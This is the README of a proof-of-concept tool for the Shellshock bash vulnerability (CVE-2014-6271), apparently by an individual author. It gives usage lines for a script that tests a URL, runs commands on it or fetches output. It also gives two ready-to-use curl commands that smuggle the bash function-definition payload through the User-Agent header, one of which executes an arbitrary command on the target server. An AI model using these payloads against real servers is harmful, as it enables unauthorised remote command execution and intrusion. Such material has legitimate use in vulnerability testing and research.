CVE 2014-6271 PoC Tool by kaitoY 
==========
kaitoy@qq.com

Usage:

    shellshock.py -u <url> test
    shellshock.py -u <url> exec -c <command>
    shellshock.py -u <url> get

Manual commands:

    curl -i -X HEAD "<url>" -A '() { :;}; echo "Warning: Server Vulnerable"'
    curl -A '() { :;}; /bin/bash -c "<cmd>"' <url>